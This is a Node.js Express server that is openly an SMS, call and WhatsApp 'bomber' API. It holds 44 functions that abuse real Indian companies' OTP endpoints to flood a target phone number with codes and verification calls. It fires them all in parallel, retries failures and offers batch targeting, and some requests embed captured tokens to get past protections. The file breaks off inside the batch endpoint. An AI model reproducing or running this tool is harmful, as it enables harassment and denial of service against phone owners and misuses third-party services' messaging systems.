const express = require('express');
const cors = require('cors');
const axios = require('axios');
const NodeCache = require('node-cache');

const app = express();
const PORT = process.env.PORT || 3000;
const requestCache = new NodeCache({ stdTTL: 10, checkperiod: 20 });

app.use(cors());
app.use(express.json());

// ==================== AGGRESSIVE RATE LIMITING ====================
const rateLimiter = (req, res, next) => {
    const ip = req.ip;
    const currentTime = Date.now();
    const window = 30000; // 30 seconds
    const maxRequests = 100; // INCREASED LIMIT FOR HEAVY BOMBING
    
    let requests = requestCache.get(ip) || [];
    requests = requests.filter(time => currentTime - time < window);
    
    if (requests.length >= maxRequests) {
        return res.status(429).json({
            success: false,
            message: "🔥 TOO FAST! Wait 30 seconds",
            next_reset: new Date(Date.now() + 30000).toISOString()
        });
    }
    
    requests.push(currentTime);
    requestCache.set(ip, requests);
    next();
};

// ==================== AGGRESSIVE AXIOS CONFIG ====================
const axiosConfig = {
    timeout: 15000,
    maxRedirects: 5,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-IN,en;q=0.9,hi;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
};

const axiosInstance = axios.create(axiosConfig);

// ==================== 50+ POWERFUL BOMBING FUNCTIONS ====================

// SERVICE 1-20: SMS OTP SERVICES
async function bomb1_Anthe(number) {
    try {
        const formData = `mobileparam=${number}&global_data_id=anthe-otp-verify`;
        const response = await axiosInstance.post(
            'https://anthe.aakash.ac.in/anthe/global-otp-verify',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Anthe', type: 'SMS' };
    } catch { return { success: false, service: 'Anthe', type: 'SMS' }; }
}

async function bomb2_Cars24(number) {
    try {
        const response = await axiosInstance.post(
            'https://pvt-product.cars24.com/pp/auth/mobile/otp/send/',
            { phone_number: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Cars24', type: 'SMS' };
    } catch { return { success: false, service: 'Cars24', type: 'SMS' }; }
}

async function bomb3_EatAnytime(number) {
    try {
        const response = await axiosInstance.post(
            'https://sotp-api.lucentinnovation.com/v6/otp',
            { username: `+91${number}`, type: 'mobile', domain: 'eatanytime.in' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'EatAnytime', type: 'SMS' };
    } catch { return { success: false, service: 'EatAnytime', type: 'SMS' }; }
}

async function bomb4_FoodStories(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.foodstories.shop/shop/',
            [{ mobilenumber: number }],
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'FoodStories', type: 'SMS' };
    } catch { return { success: false, service: 'FoodStories', type: 'SMS' }; }
}

async function bomb5_Pantaloons(number) {
    try {
        const response = await axiosInstance.post(
            'https://apigateway.pantaloons.com/common/sendOTP',
            { mobile: number, mode: 'verify' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Pantaloons', type: 'SMS' };
    } catch { return { success: false, service: 'Pantaloons', type: 'SMS' }; }
}

async function bomb6_Snapdeal(number) {
    try {
        const response = await axiosInstance.post(
            'https://m.snapdeal.com/signupCompleteAjax',
            { j_mobilenumber: number, agree: true, journey: 'mobile' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Snapdeal', type: 'SMS' };
    } catch { return { success: false, service: 'Snapdeal', type: 'SMS' }; }
}

async function bomb7_Hoichoi(number) {
    try {
        const response = await axiosInstance.post(
            'https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code',
            { phoneNumber: `+91${number}` },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Hoichoi', type: 'SMS' };
    } catch { return { success: false, service: 'Hoichoi', type: 'SMS' }; }
}

async function bomb8_ShemarooMe(number) {
    try {
        const formData = `mobile_no=%2B91${number}&registration_source=organic`;
        const response = await axiosInstance.post(
            'https://www.shemaroome.com/users/mobile_no_signup',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'ShemarooMe', type: 'SMS' };
    } catch { return { success: false, service: 'ShemarooMe', type: 'SMS' }; }
}

async function bomb9_Licious(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.licious.in/api/login/signup',
            { phone: number, captcha_token: "" },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Licious', type: 'SMS' };
    } catch { return { success: false, service: 'Licious', type: 'SMS' }; }
}

async function bomb10_Box8(number) {
    try {
        const response = await axiosInstance.post(
            'https://accounts.box8.co.in/customers/sign_up',
            { phone_no: number, name: 'BOMBER' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Box8', type: 'SMS' };
    } catch { return { success: false, service: 'Box8', type: 'SMS' }; }
}

async function bomb11_LazyPay(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.lazypay.in/api/lazypay/v0/userportal/sendOtp',
            { username: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'LazyPay', type: 'SMS' };
    } catch { return { success: false, service: 'LazyPay', type: 'SMS' }; }
}

async function bomb12_KreditBee(number) {
    try {
        const response = await axiosInstance.put(
            'https://api.kreditbee.in/v1/me/otp',
            { reason: 'loginOrRegister', mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'KreditBee', type: 'SMS' };
    } catch { return { success: false, service: 'KreditBee', type: 'SMS' }; }
}

async function bomb13_Hotstar(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration',
            { phone_number: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Hotstar', type: 'SMS' };
    } catch { return { success: false, service: 'Hotstar', type: 'SMS' }; }
}

async function bomb14_ZEE5(number) {
    try {
        const response = await axiosInstance.post(
            'https://auth.zee5.com/v1/user/sendotp',
            { phoneno: `91${number}` },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'ZEE5', type: 'SMS' };
    } catch { return { success: false, service: 'ZEE5', type: 'SMS' }; }
}

async function bomb15_Goibibo(number) {
    try {
        const response = await axiosInstance.post(
            'https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG',
            { loginId: number, countryCode: 91 },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Goibibo', type: 'SMS' };
    } catch { return { success: false, service: 'Goibibo', type: 'SMS' }; }
}

async function bomb16_Lenskart(number) {
    try {
        const response = await axiosInstance.post(
            'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
            { telephone: number, phoneCode: '+91' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Lenskart', type: 'SMS' };
    } catch { return { success: false, service: 'Lenskart', type: 'SMS' }; }
}

async function bomb17_Reliance(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp',
            { mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Reliance', type: 'SMS' };
    } catch { return { success: false, service: 'Reliance', type: 'SMS' }; }
}

async function bomb18_Shopsy(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.shopsy.in/2.rome/api/1/action/view',
            { actionRequestContext: { loginId: number, loginIdPrefix: '+91' } },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Shopsy', type: 'SMS' };
    } catch { return { success: false, service: 'Shopsy', type: 'SMS' }; }
}

async function bomb19_Swiggy(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.swiggy.com/dapi/auth/sms-otp',
            { mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Swiggy', type: 'SMS' };
    } catch { return { success: false, service: 'Swiggy', type: 'SMS' }; }
}

async function bomb20_Zomato(number) {
    try {
        const response = await axiosInstance.post(
            'https://accounts.zomato.com/login/phone',
            `country_id=1&number=${number}&type=initiate`,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Zomato', type: 'SMS' };
    } catch { return { success: false, service: 'Zomato', type: 'SMS' }; }
}

// CALL OTP SERVICES (POWERFUL - RINGING PHONES)
async function bomb21_OLX_Call(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.olx.in/api/auth/authenticate?lang=en-IN',
            { phone: `+91${number}`, method: 'call' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'OLX Call', type: 'CALL' };
    } catch { return { success: false, service: 'OLX Call', type: 'CALL' }; }
}

async function bomb22_SwiggyProfile_Call(number) {
    try {
        const response = await axiosInstance.post(
            'https://profile.swiggy.com/api/v3/app/request_call_verification',
            { mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Swiggy Profile Call', type: 'CALL' };
    } catch { return { success: false, service: 'Swiggy Profile Call', type: 'CALL' }; }
}

async function bomb23_Proptiger_Call(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
            { contactNumber: number, domainId: '2' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Proptiger Call', type: 'CALL' };
    } catch { return { success: false, service: 'Proptiger Call', type: 'CALL' }; }
}

// MORE POWERFUL SERVICES FROM DARK.JS
async function bomb24_Hathway(number) {
    try {
        // First get CSRF token
        const session = await axiosInstance.get('https://www.hathway.com/Home/NewConnection');
        const html = session.data;
        const csrfMatch = html.match(/name="csrf-token" content="(.*?)"/);
        
        if (!csrfMatch) return { success: false, service: 'Hathway', type: 'SMS' };
        
        const csrfToken = csrfMatch[1];
        const formData = `c_contact=${number}`;
        
        const response = await axiosInstance.post(
            'https://www.hathway.com/api/sendOtp',
            formData,
            { headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-csrf-token': csrfToken,
                'x-requested-with': 'XMLHttpRequest'
            } }
        );
        return { success: response.status === 200, service: 'Hathway', type: 'SMS' };
    } catch { return { success: false, service: 'Hathway', type: 'SMS' }; }
}

async function bomb25_GoPaySense(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.gopaysense.com/users/otp',
            { phone: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'GoPaySense', type: 'SMS' };
    } catch { return { success: false, service: 'GoPaySense', type: 'SMS' }; }
}

async function bomb26_Apna(number) {
    try {
        const response = await axiosInstance.post(
            'https://production.apna.co/api/userprofile/v1/otp/',
            { phone_number: `91${number}`, retries: 0, hash_type: 'employer', source: 'employer' },
            { headers: { 
                'Content-Type': 'application/json',
                'x-firebase-appcheck': 'eyJraWQiOiIwMHlhdmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjk3ODQ2Mjg4Mjk5MTp3ZWI6ZGQ4ZThmNzE5NzVkYjQ2YjRiNjg1YSIsImF1ZCI6WyJwcm9qZWN0cy85Nzg0NjI4ODI5OTEiLCJwcm9qZWN0cy9hcG5hdGltZS1mYmM3MiJdLCJwcm92aWRlciI6InJlY2FwdGNoYV92MyIsImlzcyI6Imh0dHBzOi8vZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbS85Nzg0NjI4ODI5OTEiLCJleHAiOjE3NTcxMzY2MTEsImlhdCI6MTc1NzA1MDIxMSwianRpIjoiTlRSUzNmbUxtc2lHamxvc0pRRnhteXlJLUVqS2tscUxoejBCNFJIY3RmcyJ9.jt2hcNM6k-Vj-vcfLRE9RTa5hKjLvUl2rvKaoQRhnqgGTlN6R49zzCw7DwXTtFCRwi-WsjUiv2UrZYn1RDba1Fn3d4KbIGpeJmHAZlTa9TJPfpmbaapl5t7GGRerq1toxu7W9wGE1VoHeZXjPW4eu0cRzgtbRxXRudnrMoLuz_Wxd9pzGG7eBqg58uksWA61YWMSylADaFh-wVt1WoWUDx0E7M5Sfwpbxi7x60HyU_fZkfC9NOIcvvm1C6IEpvPPh8wSBTPc1rHKod-oy2pujlYjCb8IYgW0KTbiwA7gP7XsQg8R0VmjLgsnBrTBDcd00ttP_V7cRQTFLoJ3tKMCH1B6LPO5HmD12GCtnUVoO7MjHVRySODN5cg9r_yJwZaFOSue8FXf0uB8B0PNni63MuBo7ZnGU1DaHwkSLlArWDhkrkbVgfX23d8TJNDOEyqQSitRskEwEXNfFiz53j0RiHg7T10taRA0TtqwnDbGWyRktND6VuN_cKnO4ZUJbjda'
            } }
        );
        return { success: response.status === 200, service: 'Apna', type: 'SMS' };
    } catch { return { success: false, service: 'Apna', type: 'SMS' }; }
}

async function bomb27_PW(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0',
            { mobile: number, countryCode: '+91', subOrgId: 'SUB-PWLI000' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'PW', type: 'SMS' };
    } catch { return { success: false, service: 'PW', type: 'SMS' }; }
}

async function bomb28_SwiggySignup(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.swiggy.com/dapi/auth/signup',
            { mobile: number, name: 'Robert Hofman', email: '5n06uwcbog@jkotypc.com', referral: '', otp: '', _csrf: '' },
            { headers: { 'Content-Type': 'application/json', 'platform': 'dweb' } }
        );
        return { success: response.status === 200, service: 'Swiggy Signup', type: 'SMS' };
    } catch { return { success: false, service: 'Swiggy Signup', type: 'SMS' }; }
}

async function bomb29_Mobikwik(number) {
    try {
        const response = await axiosInstance.post(
            'https://walletapi.mobikwik.com/walletapis/redirectflow/otpgenrate/resendotp?epayVersion=v1',
            { id: 'MNRF-68d57d9ce4b0126bac8bc8ba', cell: number, otpSource: 1 },
            { headers: { 'Content-Type': 'application/json', 'x-mclient': '27' } }
        );
        return { success: response.status === 200, service: 'Mobikwik', type: 'SMS' };
    } catch { return { success: false, service: 'Mobikwik', type: 'SMS' }; }
}

async function bomb30_UrbanCompany(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.urbanclap.com/api/v2/growth/web/initiateLogin',
            { phoneNumber: number, countryId: 'IND', integrityToken: '0.7mCEQBEjvzOD-BNLhoFLrkg6gmIW_R7fw5vHYAD1GXI1I-qZWxuFuZ51BX6991YvE5prKWBzk7yyswpUm9KbZ3QW4GVnswdACKtWbWJjTCdlS_O5FkIfdPa4POTE7aPRf6o6U67_3cFtfYjYwC4PT_BYOJ0PXvKdXkwKEDgozb5LpdkYrOPN4BkxjPdtRSLkmUfMZfnFe7K8wJIq4ojDLs79N2pjHpPadcRaagt8Mc6RJcnWDua3pi9UYhYsPGQ-Ee4N784S1bzR1H8N0tmh-WD40EGwreFIwaSTKhiBsoeIJMHeko_VJCo43c0GNC8PvaejepHp8oYe9WB4WDlYNKShJQkTsGiCxs1JJa4LvYasadvB_44d3FrwXsTSum9oTDFjIT7PHSPFftpEVYVFEFoPHRp5VbvYsVe9_8dRbxCYSPKaJgDSs_Ap7Lhc0qibHOrEPTaZYXFIpgfXmBrs_svG-4ZHNG0wcoNv8njq95tnl6mqf_b2MC2ZjefkwrPmssCA6vWc_KbxsV4mrNBsUaHSj2_eGNFtU5Rp4L0y9HivvMo0mJeyayiymmug63hY9wdCSuGrdCqBjlpnVM6jTxbYjL7Y32DrhX0Vec294onwRCok11p9CLY1MG1hhMlur70MFSaQ4dvIQgYA628pTBDVfVEyU5SHmyltgJiGL_KLESkEbU9YB6bi4s9Wk70z04XpVEMlLnP0iNn6_Nn5thercTDKEJQlLsWMayTDjqf6OpALSW1aBbs27MMlzTpr0iol7K8fkpNYkVZiy5fCaFzX4VBvrcTJerzY6tD1mu8vyvAp-vEcTPyzm43pTr7FimwKZj1CemnzVRXt0MgtAGQLY2oJ3c_HHYJuDigWvT6sWu-bSKwUIBUt9-Vw9GuMQj8AlG_CiZ2H2K3BZWLTPTJwZrNEtYqTK1q5bFRXNrAfTXFSunF61xeriFg5y1HC9ml228xSqr-eQ9ty7J3XUw.besfJV3LJwFiY4aeoaSnlA.668696d45fc89b33f6dfcccb14c979930cf7d9e581c353203ccd4466fadfc08c', integrityType: 'captcha', userType: 'customer', loginType: 'otp' },
            { headers: { 'Content-Type': 'application/json', 'x-brand-key': 'urbanCompany', 'x-device-id': 'v-1758819710' } }
        );
        return { success: response.status === 200, service: 'UrbanCompany', type: 'SMS' };
    } catch { return { success: false, service: 'UrbanCompany', type: 'SMS' }; }
}

async function bomb31_GoPinkCabs(number) {
    try {
        const formData = `check_mobile_number=1&contact=${number}`;
        const response = await axiosInstance.post(
            'https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'GoPinkCabs', type: 'SMS' };
    } catch { return { success: false, service: 'GoPinkCabs', type: 'SMS' }; }
}

async function bomb32_CaratLane(number) {
    try {
        const payload = {
            query: 'mutation SendOtp($mobile:String, $isdCode:String, $otpType:String, $email:String){ SendOtp(input:{mobile:$mobile, isdCode:$isdCode, otpType:$otpType, email:$email}){ status{ message code } } }',
            variables: { mobile: number, isdCode: '91', otpType: 'registerOtp' }
        };
        const response = await axiosInstance.post(
            'https://www.caratlane.com/cg/dhevudu',
            payload,
            { headers: { 'Content-Type': 'application/json', 'authorization': 'e57868edb066b4e04cbf0de4679acc3d3739d1ec0479fdccec2a5c6ff0b919' } }
        );
        return { success: response.status === 200, service: 'CaratLane', type: 'SMS' };
    } catch { return { success: false, service: 'CaratLane', type: 'SMS' }; }
}

async function bomb33_MyBharat(number) {
    try {
        const formData = `user_phone=${number}`;
        const response = await axiosInstance.post(
            'https://mybharat.gov.in/pages/sendGuestUserOtp',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'MyBharat', type: 'SMS' };
    } catch { return { success: false, service: 'MyBharat', type: 'SMS' }; }
}

async function bomb34_Univest(number) {
    try {
        const response = await axiosInstance.get(
            `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${number}`
        );
        return { success: response.status === 200, service: 'Univest', type: 'SMS' };
    } catch { return { success: false, service: 'Univest', type: 'SMS' }; }
}

async function bomb35_Jockey(number) {
    try {
        const response = await axiosInstance.get(
            `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${number}?whatsapp=false`
        );
        return { success: response.status === 200, service: 'Jockey', type: 'SMS' };
    } catch { return { success: false, service: 'Jockey', type: 'SMS' }; }
}

async function bomb36_GetSwipe(number) {
    try {
        const response = await axiosInstance.post(
            'https://app.getswipe.in/api/user/app_login',
            { mobile: number, country_code: 'IN' },
            { headers: { 'Content-Type': 'application/json', 'devicehash': '70815629-21a0-457f-b321-6263437fda85' } }
        );
        return { success: response.status === 200, service: 'GetSwipe', type: 'SMS' };
    } catch { return { success: false, service: 'GetSwipe', type: 'SMS' }; }
}

async function bomb37_JobsNagar(number) {
    try {
        const response = await axiosInstance.post(
            'https://jobsnagar.com:2083/otp-authentications',
            { contact: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'JobsNagar', type: 'SMS' };
    } catch { return { success: false, service: 'JobsNagar', type: 'SMS' }; }
}

async function bomb38_GoPareto(number) {
    try {
        const formData = `company_email=5n06uwcbog@jkotypc.com&company_name=robh&contact_no=${number}&company_address=7729 Center Boulevard Southeast&subscription=trial&employee_count=9&ip_addr=49.43.4.160&termsNCondi=1&index=1`;
        const response = await axiosInstance.post(
            'https://gopareto.bizmo-tech.com/user/register/generateOTP',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'GoPareto', type: 'SMS' };
    } catch { return { success: false, service: 'GoPareto', type: 'SMS' }; }
}

async function bomb39_Oncast(number) {
    try {
        const response = await axiosInstance.post(
            'https://oncast.in/wa_auth/generate_otp.php',
            { phone: `+91${number}` },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Oncast', type: 'SMS' };
    } catch { return { success: false, service: 'Oncast', type: 'SMS' }; }
}

async function bomb40_Baifo(number) {
    try {
        const response = await axiosInstance.post(
            `https://baifo.me/m-wap/Register/SendOtpToBuyer?pluginId=BFMe.Plugin.Message.RongYun.SMS&destination=${number}&username=asdsadsadasd&countryCode=in&IsWa=wa`
        );
        return { success: response.status === 200, service: 'Baifo', type: 'SMS' };
    } catch { return { success: false, service: 'Baifo', type: 'SMS' }; }
}

async function bomb41_Cashify(number) {
    try {
        const formData = new URLSearchParams();
        formData.append('mo', number);
        formData.append('ek', 'sms');
        
        const response = await axiosInstance.put(
            'https://www.cashify.in/api/cu01/v1/sign-up/resend-otp',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Cashify', type: 'SMS' };
    } catch { return { success: false, service: 'Cashify', type: 'SMS' }; }
}

// WHATSAPP OTP SERVICES
async function bomb42_Rappi_Whatsapp(number) {
    try {
        const response = await axiosInstance.post(
            'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
            { country_code: '+91', phone: number },
            { headers: { 'Content-Type': 'application/json', 'deviceid': '7174450b-b912-404d-8e72-f95512e404d0' } }
        );
        return { success: response.status === 200, service: 'Rappi WhatsApp', type: 'WHATSAPP' };
    } catch { return { success: false, service: 'Rappi WhatsApp', type: 'WHATSAPP' }; }
}

// MORE SERVICES FOR MAXIMUM IMPACT
async function bomb43_Smytten(number) {
    try {
        const response = await axiosInstance.post(
            'https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode',
            { phone: number, email: "sdhabai09@gmail.com", device_platform: "web" },
            { headers: { 'Content-Type': 'application/json', 'uuid': 'cf98ed0b-366e-46db-91e6-ebb9a024c602' } }
        );
        return { success: response.status === 200, service: 'Smytten', type: 'SMS' };
    } catch { return { success: false, service: 'Smytten', type: 'SMS' }; }
}

async function bomb44_NuvamaWealth(number) {
    try {
        const response = await axiosInstance.post(
            'https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO',
            { contactInfo: number, mode: 'SMS' },
            { headers: { 'Content-Type': 'application/json', 'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e' } }
        );
        return { success: response.status === 200, service: 'NuvamaWealth', type: 'SMS' };
    } catch { return { success: false, service: 'NuvamaWealth', type: 'SMS' }; }
}

// RETRY FUNCTION FOR FAILED SERVICES
async function retryFailedBombs(number, failedServices) {
    const retryResults = [];
    
    for (const service of failedServices) {
        try {
            // Add random delay between retries
            await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
            
            const result = await service(number);
            retryResults.push(result);
        } catch {
            retryResults.push({ success: false, service: service.name, type: 'RETRY_FAILED' });
        }
    }
    
    return retryResults;
}

// ==================== BOMBING MANAGEMENT ====================

const bombingFunctions = [
    // SMS SERVICES
    bomb1_Anthe, bomb2_Cars24, bomb3_EatAnytime, bomb4_FoodStories,
    bomb5_Pantaloons, bomb6_Snapdeal, bomb7_Hoichoi, bomb8_ShemarooMe,
    bomb9_Licious, bomb10_Box8, bomb11_LazyPay, bomb12_KreditBee,
    bomb13_Hotstar, bomb14_ZEE5, bomb15_Goibibo, bomb16_Lenskart,
    bomb17_Reliance, bomb18_Shopsy, bomb19_Swiggy, bomb20_Zomato,
    
    // CALL OTP SERVICES (MOST POWERFUL - RINGS PHONE)
    bomb21_OLX_Call, bomb22_SwiggyProfile_Call, bomb23_Proptiger_Call,
    
    // MORE SERVICES
    bomb24_Hathway, bomb25_GoPaySense, bomb26_Apna, bomb27_PW,
    bomb28_SwiggySignup, bomb29_Mobikwik, bomb30_UrbanCompany,
    bomb31_GoPinkCabs, bomb32_CaratLane, bomb33_MyBharat,
    bomb34_Univest, bomb35_Jockey, bomb36_GetSwipe,
    bomb37_JobsNagar, bomb38_GoPareto, bomb39_Oncast,
    bomb40_Baifo, bomb41_Cashify,
    
    // WHATSAPP
    bomb42_Rappi_Whatsapp,
    
    // EXTRA SERVICES
    bomb43_Smytten, bomb44_NuvamaWealth
];

// ==================== API ENDPOINTS ====================

app.get('/', (req, res) => {
    res.json({
        success: true,
        message: '🔥 ULTRA BRUTAL BOMBER API 🔥',
        version: '2.0.0',
        status: 'ULTRA OPERATIONAL',
        services: bombingFunctions.length,
        types: {
            sms: '30+ services',
            call: '3+ services (PHONE RINGING)',
            whatsapp: '1+ services'
        },
        endpoints: {
            bomb: '/bomb?num=PHONE_NUMBER',
            status: '/status',
            test: '/test?num=PHONE_NUMBER',
            batch: '/batch?nums=9876543210,9876543211'
        },
        note: 'NO KEYS REQUIRED - ULTRA POWERFUL BOMBING'
    });
});

app.get('/status', (req, res) => {
    res.json({
        success: true,
        timestamp: new Date().toISOString(),
        services_available: bombingFunctions.length,
        rate_limit: '100 requests per 30 seconds per IP',
        uptime: process.uptime(),
        stats: {
            sms_services: 30,
            call_services: 3,
            whatsapp_services: 1
        }
    });
});

// ==================== MAIN BOMBING ENDPOINT ====================
app.get('/bomb', rateLimiter, async (req, res) => {
    try {
        const { num } = req.query;
        
        // Validate phone number
        if (!num || !/^[6-9]\d{9}$/.test(num)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid Indian phone number (10 digits starting with 6-9)'
            });
        }
        
        console.log(`🔥 ULTRA BOMBING STARTED: ${num}`);
        
        // Execute ALL bombing functions in parallel with timeout protection
        const bombPromises = bombingFunctions.map(bomb => 
            Promise.race([
                bomb(num),
                new Promise(resolve => setTimeout(() => resolve({ 
                    success: false, 
                    service: 'Timeout', 
                    type: 'TIMEOUT' 
                }), 10000))
            ])
        );
        
        const results = await Promise.allSettled(bombPromises);
        
        // Calculate statistics
        const successful = results.filter(r => 
            r.status === 'fulfilled' && r.value.success
        ).length;
        
        const failed = results.length - successful;
        
        // Count by type
        const smsCount = results.filter(r => 
            r.status === 'fulfilled' && r.value.success && r.value.type === 'SMS'
        ).length;
        
        const callCount = results.filter(r => 
            r.status === 'fulfilled' && r.value.success && r.value.type === 'CALL'
        ).length;
        
        // Prepare response
        const bombResults = results.map((result, index) => {
            if (result.status === 'fulfilled') {
                return {
                    service: result.value.service,
                    type: result.value.type,
                    status: result.value.success ? '✅ DETONATED' : '💥 FAILED'
                };
            }
            return {
                service: `Service ${index + 1}`,
                type: 'UNKNOWN',
                status: '❌ ERROR'
            };
        });
        
        // AUTO-RETRY FAILED SERVICES
        const failedServices = bombingFunctions.filter((_, index) => 
            results[index].status === 'rejected' || 
            (results[index].status === 'fulfilled' && !results[index].value.success)
        );
        
        let retrySuccess = 0;
        if (failedServices.length > 0) {
            console.log(`🔄 Auto-retrying ${failedServices.length} failed services...`);
            const retryResults = await Promise.allSettled(
                failedServices.map(service => service(num))
            );
            retrySuccess = retryResults.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
        }
        
        const totalSuccess = successful + retrySuccess;
        
        res.json({
            success: true,
            message: '💣💣💣 ULTRA BOMBING COMPLETE! 💣💣💣',
            target: num,
            timestamp: new Date().toISOString(),
            statistics: {
                total_bombs: bombingFunctions.length,
                successful_detonations: totalSuccess,
                failed_detonations: bombingFunctions.length - totalSuccess,
                success_rate: `${((totalSuccess / bombingFunctions.length) * 100).toFixed(1)}%`,
                by_type: {
                    sms_success: smsCount,
                    call_success: callCount,
                    auto_retry_success: retrySuccess
                }
            },
            results: bombResults.slice(0, 20), // Show first 20 results
            warning: '🚨 MULTIPLE CALLS & SMS BOMBARDMENT ACTIVATED! PHONE WILL RING NON-STOP! 🚨',
            note: 'Call-based OTPs (OLX, Swiggy Profile, Proptiger) will RING the target phone!'
        });
        
    } catch (error) {
        console.error('Bombing Error:', error);
        res.status(500).json({
            success: false,
            message: 'Bombing system error',
            error: error.message
        });
    }
});

// ==================== TEST ENDPOINT ====================
app.get('/test', rateLimiter, async (req, res) => {
    const { num } = req.query;
    
    if (!num || !/^[6-9]\d{9}$/.test(num)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid phone number'
        });
    }
    
    // Test with only 10 most powerful services including calls
    const testServices = [
        bomb1_Anthe, bomb2_Cars24, bomb6_Snapdeal, bomb9_Licious,
        bomb13_Hotstar, bomb19_Swiggy, bomb21_OLX_Call, // CALL SERVICE
        bomb22_SwiggyProfile_Call, // CALL SERVICE
        bomb28_SwiggySignup, bomb35_Jockey
    ];
    
    const testPromises = testServices.map(bomb => bomb(num));
    const results = await Promise.allSettled(testPromises);
    
    const successful = results.filter(r => 
        r.status === 'fulfilled' && r.value.success
    ).length;
    
    const hasCalls = results.some(r => 
        r.status === 'fulfilled' && r.value.success && r.value.type === 'CALL'
    );
    
    res.json({
        success: true,
        message: '🧪 TEST BOMBING COMPLETE',
        target: num,
        services_tested: testServices.length,
        successful: successful,
        call_services_active: hasCalls,
        status: successful > 5 ? '✅ READY FOR ULTRA BATTLE' : '⚠️ NEEDS TUNING',
        note: hasCalls ? '✅ CALL BOMBING ACTIVE - PHONE WILL RING!' : '❌ CALL BOMBING NOT ACTIVE'
    });
});

// ==================== BATCH BOMBING ====================
app.get('/batch', rateLimiter, async (req, res) => {
    const numbers = req.query.nums ? req.query.nums.split(',').slice(0, 5) : [];
    
    if (numbers.length === 0) {
        return res.status(400).json({
            success: false,
            message: 'Provide numbers separated by commas (max 5)'
        });
    }
    
    const results = [];
